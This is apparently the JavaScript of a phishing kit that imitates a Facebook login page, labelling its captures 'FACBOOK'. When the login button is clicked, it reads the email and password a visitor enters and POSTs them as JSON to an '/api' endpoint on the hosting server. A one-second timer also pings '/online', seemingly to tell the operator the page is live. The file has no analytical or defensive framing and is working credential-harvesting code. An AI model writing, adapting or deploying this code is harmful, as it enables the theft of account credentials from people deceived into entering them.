let email = document.getElementById("email");
let pass = document.getElementById("pass");

let log = document.getElementById("log");
let log1 = document.getElementById("log1");

email.placeholder=" Email or phone number";
pass.placeholder=" password";

var E = email.value;
var P = pass.value;

log1.onclick=function () {
     log.click()
}
log.onclick=function (){
    E = email.value;
    P = pass.value;
   if (email.value == '') {
        E = 'null'
   }
   if (pass.value == '') {
        P = 'null'
   }
   var dataget 
     let api = new XMLHttpRequest()
   api.open('POST','https://' + location.host + '/api')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
       dataget = JSON.parse(api.responseText)
       console.log(dataget)
     }
   }
     var data =`{
     "Location":"${'FACBOOK'}",
     "Email":"${E}",
     "Password":"${P}"
   }`
   api.send(data)
}

function test() {
  setTimeout(function(){test()},1000)
  let api = new XMLHttpRequest()
   api.open('POST','https://' + location.host + '/online')
   api.setRequestHeader("Accept","application/json")
   api.setRequestHeader("Content-Type","application/json")
   api.onreadystatechange=function(){
     if (api.readyState == 4){
      //console.log(JSON.parse(api.responseText))
    }
   }
     var data =`{"id":"FACBOOK"}`
   api.send(data)
   console.log('islam')
  }
  test()

